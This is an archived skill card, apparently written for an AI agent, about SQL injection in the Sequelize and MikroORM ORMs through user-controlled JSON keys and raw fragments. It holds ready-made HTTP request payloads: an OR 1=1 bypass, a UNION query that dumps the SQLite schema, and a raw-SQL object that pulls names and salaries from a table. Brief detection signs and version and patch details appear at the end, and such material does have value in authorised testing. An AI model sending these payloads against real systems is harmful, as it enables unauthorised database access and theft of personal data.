<!-- archived from /root/.hermes/skills/security/orm-json-key-sqli/SKILL.md on 2026-10-21 -->

---
name: orm-json-key-sqli
description: "Use when Sequelize/MikroORM/HoneySQL. ORM SQLi."
---

> 归档卡：原目录 `/root/.hermes/skills/security/orm-json-key-sqli`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/orm-json-key-sqli/…')`，不要相对 `references/legacy/` 解析。

# ORM JSON Key/Cast SQL Injection Family

Covers CVE-2026-30951 (Sequelize), CVE-2026-34220 (MikroORM), and similar ORM-layer injection where user-controlled JSON keys or raw fragments bypass parameterization.

## Sequelize v6 JSON Cast Injection (CVE-2026-30951)
Sequelize <= 6.37.7. JSON `where` clause splits keys on `::` — cast type inserted raw into SQL.

### Payload
```http
POST /api/users/search
Content-Type: application/json

{"filter":{"name::text) OR 1=1--":"x"}}
```
Generates: `CAST(json_extract(...) AS TEXT) OR 1=1--)` — boolean-based SQLi.

### Data exfil (SQLite)
```json
{"filter":{"name::text) UNION SELECT sql FROM sqlite_master--":"x"}}
```
Patched in 6.37.8. Not affected: Sequelize v7.

## MikroORM Raw Fragment Injection (CVE-2026-34220/43220)
MikroORM <= 6.4.3 / 7.0.0-7.0.5. Custom Type columns with `__raw` property bypass `isRaw()` check.

### Payload
```http
POST /write
Content-Type: application/json

{"author":"x","title":"x","content":{"__raw":true,"sql":"(SELECT group_concat(name||':'||salary) FROM salaries)"}}
```
Patched in 6.4.4 / 7.0.6.

## HoneySQL Raw Injection (Metabase pattern)
Clojure HoneySQL `{:raw ...}` fragments from user input — see `metabase-preauth-sqli` skill.

## Detection Pattern
- App uses ORM with JSON/JSONB columns + user-controlled filter keys
- Error messages mention Sequelize/MikroORM/Knex
- API accepts nested JSON objects in query/filter parameters

## Pitfalls
- ORM injection != classic SQLi — payload goes through JSON keys not values
- Backend DB matters: SQLite vs PostgreSQL vs MySQL syntax
- Source: EQSTLab/CVE-2026-30951, CVE-2026-34220
